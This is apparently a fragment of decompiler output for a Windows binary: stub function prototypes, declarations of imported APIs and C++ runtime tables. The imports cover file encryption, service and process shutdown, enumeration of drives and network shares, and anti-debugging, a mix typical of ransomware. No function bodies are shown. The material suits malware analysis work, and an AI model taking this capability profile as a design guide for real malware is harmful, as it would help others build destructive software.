void __cdecl sub_48A9E0(); // idb
void __cdecl sub_48AA40(); // idb
void __cdecl sub_48AAA0(); // idb
void __cdecl sub_48AB00(); // idb
void __cdecl sub_48AB60(); // idb
void __cdecl sub_48ABC0(); // idb
void __cdecl sub_48AC20(); // idb
void __cdecl sub_48AC80(); // idb
void __cdecl sub_48ACE0(); // idb
void __cdecl sub_48AD40(); // idb
void __cdecl sub_48ADA0(); // idb
void __cdecl sub_48AE00(); // idb
void __cdecl sub_48AE60(); // idb
void __cdecl sub_48AEC0(); // idb
void __cdecl sub_48AF20(); // idb
void __cdecl sub_48AF80(); // idb
void __cdecl sub_48AFE0(); // idb
void __cdecl sub_48B040(); // idb
void __cdecl sub_48B0A0(); // idb
void __cdecl sub_48B100(); // idb
void __cdecl sub_48B160(); // idb
void __cdecl sub_48B1C0(); // idb
void __cdecl sub_48B220(); // idb
void __cdecl sub_48B280(); // idb
void __cdecl sub_48B2E0(); // idb
void __cdecl sub_48B340(); // idb
void __cdecl sub_48B3A0(); // idb
void __cdecl sub_48B400(); // idb
void __cdecl sub_48B460(); // idb
void __cdecl sub_48B4C0(); // idb
void __cdecl sub_48B520(); // idb
void __cdecl sub_48B580(); // idb
void __cdecl sub_48B5E0(); // idb
void __cdecl sub_48B640(); // idb
void __cdecl sub_48B6A0(); // idb
void __cdecl sub_48B700(); // idb
void __cdecl sub_48B760(); // idb
void __cdecl sub_48B7C0(); // idb
void __cdecl sub_48B820(); // idb
void __cdecl sub_48B880(); // idb
void __cdecl sub_48B8E0(); // idb
void __cdecl sub_48B940(); // idb
void __cdecl sub_48B9A0(); // idb
void __cdecl sub_48BA00(); // idb
void __cdecl sub_48BA60(); // idb
void __cdecl sub_48BAC0(); // idb
void __cdecl sub_48BB20(); // idb
void __cdecl sub_48BB80(); // idb
void __cdecl sub_48BBE0(); // idb
void __cdecl sub_48BC40(); // idb
void __cdecl sub_48BCA0(); // idb
void __cdecl sub_48BD00(); // idb
void __cdecl sub_48BD60(); // idb
void __cdecl sub_48BDC0(); // idb
void __cdecl sub_48BE20(); // idb
void __cdecl sub_48BE80(); // idb
void __cdecl sub_48BEE0(); // idb
void __cdecl sub_48BF40(); // idb
void __cdecl sub_48BFA0(); // idb
void __cdecl sub_48C000(); // idb
void __cdecl sub_48C060(); // idb
void __cdecl sub_48C0C0(); // idb
void __cdecl sub_48C120(); // idb
void __cdecl sub_48C180(); // idb
void __cdecl sub_48C1E0(); // idb
void __cdecl sub_48C240(); // idb
void __cdecl sub_48C2A0(); // idb
void __cdecl sub_48C300(); // idb
void __cdecl sub_48C360(); // idb
void __cdecl sub_48C3C0(); // idb
void __cdecl sub_48C420(); // idb
void __cdecl sub_48C480(); // idb
void __cdecl sub_48C4E0(); // idb
void __cdecl sub_48C540(); // idb
void __cdecl sub_48C5A0(); // idb
void __cdecl sub_48C600(); // idb
void __cdecl sub_48C660(); // idb
void __cdecl sub_48C6C0(); // idb
void __cdecl sub_48C720(); // idb
void __cdecl sub_48C780(); // idb
void __cdecl sub_48C7E0(); // idb
void __cdecl sub_48C840(); // idb
void __cdecl sub_48C8A0(); // idb
void __cdecl sub_48C900(); // idb
void __cdecl sub_48C960(); // idb
void __cdecl sub_48C9C0(); // idb
void __cdecl sub_48CA20(); // idb
void __cdecl sub_48CA80(); // idb
void __cdecl sub_48CAE0(); // idb
void __cdecl sub_48CB40(); // idb
void __cdecl sub_48CBA0(); // idb
void __cdecl sub_48CC00(); // idb
void __cdecl sub_48CC60(); // idb
void __cdecl sub_48CCC0(); // idb
void __cdecl sub_48CD20(); // idb
void __cdecl sub_48CD80(); // idb
void __cdecl sub_48CDE0(); // idb
void __cdecl sub_48CE40(); // idb
void __cdecl sub_48CEA0(); // idb
void __cdecl sub_48CF00(); // idb
void __cdecl sub_48CF60(); // idb
void __cdecl sub_48CFC0(); // idb
void __cdecl sub_48D020(); // idb
void __cdecl sub_48D080(); // idb
void __cdecl sub_48D0E0(); // idb
void __cdecl sub_48D140(); // idb
void __cdecl sub_48D1A0(); // idb
void __cdecl sub_48D200(); // idb
void __cdecl sub_48D260(); // idb
void __cdecl sub_48D2C0(); // idb
void __cdecl sub_48D320(); // idb
void __cdecl sub_48D380(); // idb
void __cdecl sub_48D3E0(); // idb
void __cdecl sub_48D440(); // idb
void __cdecl sub_48D4A0(); // idb
void __cdecl sub_48D500(); // idb
void __cdecl sub_48D560(); // idb
void __cdecl sub_48D5C0(); // idb
void __cdecl sub_48D620(); // idb
void __cdecl sub_48D680(); // idb
void __cdecl sub_48D6E0(); // idb
void __cdecl sub_48D740(); // idb
void __cdecl sub_48D7A0(); // idb
void __cdecl sub_48D800(); // idb
void __cdecl sub_48D860(); // idb
void __cdecl sub_48D8C0(); // idb
void __cdecl sub_48D920(); // idb
void __cdecl sub_48D980(); // idb
void __cdecl sub_48D9E0(); // idb
void __cdecl sub_48DA40(); // idb
void __cdecl sub_48DAA0(); // idb
void __cdecl sub_48DB00(); // idb
void __cdecl sub_48DB20(); // idb
void __cdecl sub_48DB40(); // idb
void __cdecl sub_48DB60(); // idb
void __cdecl sub_48DB80(); // idb
void __cdecl sub_48DBA0(); // idb
void __cdecl sub_48DBC0(); // idb
void __cdecl sub_48DBE0(); // idb
void __cdecl sub_48DC00(); // idb
void __cdecl sub_48DC70(); // idb
void __cdecl sub_48DCD0(); // idb
void __cdecl sub_48DD30(); // idb
void __cdecl sub_48DD90(); // idb
void __cdecl sub_48DDF0(); // idb
void __cdecl sub_48DE50(); // idb
void __cdecl sub_48DEB0(); // idb
void __cdecl sub_48DF10(); // idb
void __cdecl sub_48DF70(); // idb
void __cdecl sub_48DFD0(); // idb
void __cdecl sub_48E030(); // idb
void __cdecl sub_48E090(); // idb
void __cdecl sub_48E0F0(); // idb
void __cdecl sub_48E150(); // idb
void __cdecl sub_48E1B0(); // idb
void __cdecl sub_48E210(); // idb
void __cdecl sub_48E270(); // idb
void __cdecl sub_48E2D0(); // idb
void __cdecl sub_48E330(); // idb
void __cdecl sub_48E390(); // idb
void __cdecl sub_48E3F0(); // idb
void __cdecl sub_48E450(); // idb
void __cdecl sub_48E4B0(); // idb
void __cdecl sub_48E510(); // idb
void __cdecl sub_48E570(); // idb
void __cdecl sub_48E5D0(); // idb
void __cdecl sub_48E630(); // idb
void __cdecl sub_48E690(); // idb
void __cdecl sub_48E6F0(); // idb
void __cdecl sub_48E750(); // idb
void __cdecl sub_48E7B0(); // idb
void __cdecl sub_48E810(); // idb
void __cdecl sub_48E870(); // idb
void __cdecl sub_48E8D0(); // idb
void __cdecl sub_48E930(); // idb
void __cdecl sub_48E990(); // idb
void __cdecl sub_48E9F0(); // idb
void __cdecl sub_48EA50(); // idb
void __cdecl sub_48EAB0(); // idb
void __cdecl sub_48EB10(); // idb
void __cdecl sub_48EB70(); // idb
void __cdecl sub_48EBD0(); // idb
void __cdecl sub_48EC30(); // idb
void __cdecl sub_48EC90(); // idb
void __cdecl sub_48ECF0(); // idb
void __cdecl sub_48ED50(); // idb
void __cdecl sub_48EDB0(); // idb
void __cdecl sub_48EE10(); // idb
void __cdecl sub_48EE70(); // idb
void __cdecl sub_48EEC6(); // idb
void __cdecl sub_48EED2(); // idb
// void __cdecl Concurrency::details::`anonymous namespace'::`dynamic atexit destructor for '_Task_scheduler_main_block_instance''(); idb
void __cdecl sub_48EF3C(); // idb
void __cdecl sub_48EF46(); // idb
void __cdecl sub_48EF50(); // idb
void __cdecl sub_48EF5A(); // idb
void __cdecl sub_48EF64(); // idb
void __cdecl sub_48EF6E(); // idb
void __cdecl sub_48EF80(); // idb
void __cdecl sub_48EF8C(); // idb

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_481640; // weak
_UNKNOWN loc_481770; // weak
_UNKNOWN loc_482190; // weak
_UNKNOWN loc_48234B; // weak
_UNKNOWN loc_482390; // weak
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern SC_HANDLE (__stdcall *OpenServiceW)(SC_HANDLE hSCManager, LPCWSTR lpServiceName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *CryptSetKeyParam)(HCRYPTKEY hKey, DWORD dwParam, const BYTE *pbData, DWORD dwFlags);
// extern BOOL (__stdcall *CryptDestroyKey)(HCRYPTKEY hKey);
// extern BOOL (__stdcall *CryptAcquireContextW)(HCRYPTPROV *phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptEncrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);
// extern BOOL (__stdcall *CryptDuplicateKey)(HCRYPTKEY hKey, DWORD *pdwReserved, DWORD dwFlags, HCRYPTKEY *phKey);
// extern BOOL (__stdcall *CryptExportKey)(HCRYPTKEY hKey, HCRYPTKEY hExpKey, DWORD dwBlobType, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
// extern BOOL (__stdcall *CryptImportKey)(HCRYPTPROV hProv, const BYTE *pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY *phKey);
// extern BOOL (__stdcall *CryptGenKey)(HCRYPTPROV hProv, ALG_ID Algid, DWORD dwFlags, HCRYPTKEY *phKey);
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern SC_HANDLE (__stdcall *OpenSCManagerW)(LPCWSTR lpMachineName, LPCWSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *DeleteService)(SC_HANDLE hService);
// extern LSTATUS (__stdcall *RegCreateKeyW)(HKEY hKey, LPCWSTR lpSubKey, PHKEY phkResult);
// extern BOOL (__stdcall *EnumDependentServicesW)(SC_HANDLE hService, DWORD dwServiceState, LPENUM_SERVICE_STATUSW lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned);
// extern LSTATUS (__stdcall *RegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern BOOL (__stdcall *StartServiceW)(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCWSTR *lpServiceArgVectors);
// extern LSTATUS (__stdcall *RegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern BOOL (__stdcall *QueryServiceStatusEx)(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
// extern BOOL (__stdcall *CryptStringToBinaryA)(LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
// extern DWORD (__stdcall *SendARP)(IPAddr DestIP, IPAddr SrcIP, PVOID pMacAddr, PULONG PhyAddrLen);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern BOOL (__stdcall *MoveFileExW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFlags);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern DWORD (__stdcall *GetEnvironmentVariableW)(LPCWSTR lpName, LPWSTR lpBuffer, DWORD nSize);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern DWORD (__stdcall *GetShortPathNameA)(LPCSTR lpszLongPath, LPSTR lpszShortPath, DWORD cchBuffer);
// extern BOOL (__stdcall *ReleaseMutex)(HANDLE hMutex);
// extern LCID (__stdcall *GetUserDefaultLCID)();
// extern HANDLE (__stdcall *GetCurrentThread)();
// extern BOOL (__stdcall *GetThreadContext)(HANDLE hThread, LPCONTEXT lpContext);
// extern BOOL (__stdcall *IsDebuggerPresent)();
// extern USHORT (__stdcall *QueryDepthSList)(PSLIST_HEADER ListHead);
// extern PSLIST_ENTRY (__stdcall *InterlockedFlushSList)(PSLIST_HEADER ListHead);
// extern PSLIST_ENTRY (__stdcall *InterlockedPushEntrySList)(PSLIST_HEADER ListHead, PSLIST_ENTRY ListEntry);
// extern PSLIST_ENTRY (__stdcall *InterlockedPopEntrySList)(PSLIST_HEADER ListHead);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern DWORD (__stdcall *GetTickCount)();
// extern HANDLE (__stdcall *OpenMutexW)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName);
// extern BOOL (__stdcall *CreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *Process32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern BOOL (__stdcall *Process32NextW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// extern DWORD (__stdcall *GetLastError)();
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HANDLE (__stdcall *CreateMutexW)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCWSTR lpName);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern BOOL (__stdcall *FindNextVolumeW)(HANDLE hFindVolume, LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern BOOL (__stdcall *GetVolumePathNamesForVolumeNameW)(LPCWSTR lpszVolumeName, LPWCH lpszVolumePathNames, DWORD cchBufferLength, PDWORD lpcchReturnLength);
// extern BOOL (__stdcall *FindVolumeClose)(HANDLE hFindVolume);
// extern BOOL (__stdcall *SetVolumeMountPointW)(LPCWSTR lpszVolumeMountPoint, LPCWSTR lpszVolumeName);
// extern HANDLE (__stdcall *FindFirstVolumeW)(LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern BOOL (__stdcall *ReleaseSemaphore)(HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount);
// extern BOOL (__stdcall *DuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *GetVersionExW)(LPOSVERSIONINFOW lpVersionInformation);
// extern HMODULE (__stdcall *LoadLibraryExW)(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern void (__stdcall __noreturn *FreeLibraryAndExitThread)(HMODULE hLibModule, DWORD dwExitCode);
// extern BOOL (__stdcall *UnregisterWaitEx)(HANDLE WaitHandle, HANDLE CompletionEvent);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern UINT (__stdcall *GetConsoleCP)();
// extern DWORD (__stdcall *QueryDosDeviceW)(LPCWSTR lpDeviceName, LPWSTR lpTargetPath, DWORD ucchMax);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern DWORD (__stdcall *TlsAlloc)();
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern BOOL (__stdcall *TlsSetValue)(DWORD dwTlsIndex, LPVOID lpTlsValue);
// extern BOOL (__stdcall *TlsFree)(DWORD dwTlsIndex);
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern DWORD (__stdcall *WaitForSingleObjectEx)(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable);
// extern PVOID (__stdcall *EncodePointer)(PVOID Ptr);
// extern int (__stdcall *LCMapStringW)(LCID Locale, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern HANDLE (__stdcall *CreateTimerQueue)();
// extern DWORD (__stdcall *SignalObjectAndWait)(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, DWORD dwMilliseconds, BOOL bAlertable);
// extern BOOL (__stdcall *SetThreadPriority)(HANDLE hThread, int nPriority);
// extern int (__stdcall *GetThreadPriority)(HANDLE hThread);
// extern BOOL (__stdcall *GetLogicalProcessorInformation)(PSYSTEM_LOGICAL_PROCESSOR_INFORMATION Buffer, PDWORD ReturnedLength);
// extern BOOL (__stdcall *CreateTimerQueueTimer)(PHANDLE phNewTimer, HANDLE TimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags);
// extern BOOL (__stdcall *ChangeTimerQueueTimer)(HANDLE TimerQueue, HANDLE Timer, ULONG DueTime, ULONG Period);
// extern BOOL (__stdcall *DeleteTimerQueueTimer)(HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent);
// extern BOOL (__stdcall *GetNumaHighestNodeNumber)(PULONG HighestNodeNumber);
// extern BOOL (__stdcall *GetProcessAffinityMask)(HANDLE hProcess, PDWORD_PTR lpProcessAffinityMask, PDWORD_PTR lpSystemAffinityMask);
// extern DWORD_PTR (__stdcall *SetThreadAffinityMask)(HANDLE hThread, DWORD_PTR dwThreadAffinityMask);
// extern BOOL (__stdcall *RegisterWaitForSingleObject)(PHANDLE phNewWaitObject, HANDLE hObject, WAITORTIMERCALLBACK Callback, PVOID Context, ULONG dwMilliseconds, ULONG dwFlags);
// extern BOOL (__stdcall *UnregisterWait)(HANDLE WaitHandle);
// extern BOOL (__stdcall *GetThreadTimes)(HANDLE hThread, LPFILETIME lpCreationTime, LPFILETIME lpExitTime, LPFILETIME lpKernelTime, LPFILETIME lpUserTime);
// extern DWORD (__stdcall *WNetGetConnectionW)(LPCWSTR lpLocalName, LPWSTR lpRemoteName, LPDWORD lpnLength);
// extern DWORD (__stdcall *NetShareEnum)(LPWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, LPDWORD resume_handle);
// extern DWORD (__stdcall *NetApiBufferFree)(LPVOID Buffer);
// extern void (__stdcall *SysFreeString)(BSTR bstrString);
// extern void (__stdcall *VariantInit)(VARIANTARG *pvarg);
// extern BSTR (__stdcall *SysAllocStringByteLen)(LPCSTR psz, UINT len);
// extern BSTR (__stdcall *SysAllocString)(const OLECHAR *psz);
// extern HRESULT (__stdcall *VariantClear)(VARIANTARG *pvarg);
// extern UINT (__stdcall *SysStringByteLen)(BSTR bstr);
// extern DWORD (__stdcall *RmRegisterResources)(DWORD dwSessionHandle, UINT nFiles, LPCWSTR rgsFileNames[], UINT nApplications, RM_UNIQUE_PROCESS rgApplications[], UINT nServices, LPCWSTR rgsServiceNames[]);
// extern DWORD (__stdcall *RmGetList)(DWORD dwSessionHandle, UINT *pnProcInfoNeeded, UINT *pnProcInfo, RM_PROCESS_INFO rgAffectedApps[], LPDWORD lpdwRebootReasons);
// extern DWORD (__stdcall *RmStartSession)(DWORD *pSessionHandle, DWORD dwSessionFlags, WCHAR strSessionKey[]);
// extern DWORD (__stdcall *RmShutdown)(DWORD dwSessionHandle, ULONG lActionFlags, RM_WRITE_STATUS_CALLBACK fnStatus);
// extern DWORD (__stdcall *RmEndSession)(DWORD dwSessionHandle);
// extern BOOL (__stdcall *SHGetSpecialFolderPathA)(HWND hwnd, LPSTR pszPath, int csidl, BOOL fCreate);
// extern HRESULT (__stdcall *SHEmptyRecycleBinW)(HWND hwnd, LPCWSTR pszRootPath, DWORD dwFlags);
// extern HKL (__stdcall *GetKeyboardLayout)(DWORD idThread);
// extern BOOL (__stdcall *SystemParametersInfoW)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// extern HINTERNET (__stdcall *InternetConnectW)(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
// extern HINTERNET (__stdcall *HttpOpenRequestW)(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
// extern BOOL (__stdcall *InternetCloseHandle)(HINTERNET hInternet);
// extern BOOL (__stdcall *HttpSendRequestW)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
// extern BOOL (__stdcall *InternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
// extern BOOL (__stdcall *HttpSendRequestA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
// extern HINTERNET (__stdcall *InternetOpenW)(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags);
// extern int (__stdcall *WSACleanup)();
// extern struct hostent *(__stdcall *gethostbyname)(const char *name);
// extern int (__stdcall *WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
// extern unsigned int (__stdcall *inet_addr)(const char *cp);
// extern int (__stdcall *gethostname)(char *name, int namelen);
// extern char *(__stdcall *inet_ntoa)(struct in_addr in);
// extern void (__stdcall *CoUninitialize)();
// extern HRESULT (__stdcall *CoInitializeEx)(LPVOID pvReserved, DWORD dwCoInit);
// extern HRESULT (__stdcall *CoInitialize)(LPVOID pvReserved);
// extern HRESULT (__stdcall *IIDFromString)(LPCOLESTR lpsz, LPIID lpiid);
// extern HRESULT (__stdcall *CLSIDFromString)(LPCOLESTR lpsz, LPCLSID pclsid);
// extern HRESULT (__stdcall *CoGetObject)(LPCWSTR pszName, BIND_OPTS *pBindOptions, const IID *const riid, void **ppv);
// extern HRESULT (__stdcall *CoCreateInstance)(const IID *const rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, const IID *const riid, LPVOID *ppv);
// extern HRESULT (__stdcall *CoInitializeSecurity)(PSECURITY_DESCRIPTOR pSecDesc, LONG cAuthSvc, SOLE_AUTHENTICATION_SERVICE *asAuthSvc, void *pReserved1, DWORD dwAuthnLevel, DWORD dwImpLevel, void *pAuthList, DWORD dwCapabilities, void *pReserved3);
void *std::exception::`vftable' = &sub_403C70; // weak
void *std::bad_alloc::`vftable' = &sub_403C70; // weak
void *std::bad_function_call::`vftable' = &unknown_libname_3; // weak
void *std::logic_error::`vftable' = &unknown_libname_3; // weak
void *std::invalid_argument::`vftable' = &unknown_libname_3; // weak
void *std::length_error::`vftable' = &unknown_libname_3; // weak
void *std::out_of_range::`vftable' = &unknown_libname_3; // weak
void *std::runtime_error::`vftable' = &sub_403C70; // weak
void *std::bad_exception::`vftable' = &sub_42EA28; // weak
int (*`anonymous namespace'::_ExceptionPtr_static<std::bad_alloc>::`vftable'[2])() = { &_guard_check_icall_nop, &_guard_check_icall_nop }; // weak
int (*`anonymous namespace'::_ExceptionPtr_static<std::bad_exception>::`vftable'[2])() = { &_guard_check_icall_nop, &_guard_check_icall_nop }; // weak
void *Concurrency::details::stl_condition_variable_vista::`vftable' = &Concurrency::details::stl_condition_variable_vista::wait; // weak
void *Concurrency::details::stl_condition_variable_win7::`vftable' = &Concurrency::details::stl_condition_variable_win7::wait; // weak
void *Concurrency::details::stl_condition_variable_concrt::`vftable' = &Concurrency::details::stl_condition_variable_concrt::wait; // weak
void *std::future_error::`vftable' = &unknown_libname_10; // weak
void *std::bad_array_new_length::`vftable' = &sub_403C70; // weak
void *std::_System_error::`vftable' = &sub_406360; // weak
void *std::system_error::`vftable' = &sub_406360; // weak
void *std::_Generic_error_category::`vftable' = &sub_406550; // weak
void *Concurrency::details::stl_critical_section_vista::`vftable' = &Concurrency::details::stl_critical_section_vista::lock; // weak
void *Concurrency::details::stl_critical_section_win7::`vftable' = &sub_42FDE0; // weak
void *Concurrency::details::stl_critical_section_concrt::`vftable' = &sub_42FDCD; // weak
void *std::bad_cast::`vftable' = &unknown_libname_3; // weak
void *std::_Facet_base::`vftable' = &sub_430B9C; // weak
void *std::ctype<char>::`vftable' = &sub_430B40; // weak
void *std::num_get<char,std::istreambuf_iterator<char>>::`vftable' = &unknown_libname_17; // weak
void *std::num_put<char,std::ostreambuf_iterator<char>>::`vftable' = &unknown_libname_17; // weak
void *std::numpunct<char>::`vftable' = &sub_430B6E; // weak
_UNKNOWN unk_490840; // weak
void *std::ctype<wchar_t>::`vftable' = &sub_436DCD; // weak
void *std::ctype<unsigned short>::`vftable' = &std::ctype<wchar_t>::`scalar deleting destructor'; // weak
void *std::time_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable' = &sub_436EC9; // weak
void *std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable' = &unknown_libname_17; // weak
void *std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable' = &unknown_libname_17; // weak
void *std::numpunct<wchar_t>::`vftable' = &sub_436E1D; // weak
void *std::collate<wchar_t>::`vftable' = &sub_436D89; // weak
void *std::messages<wchar_t>::`vftable' = &unknown_libname_17; // weak
void *std::money_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable' = &unknown_libname_17; // weak
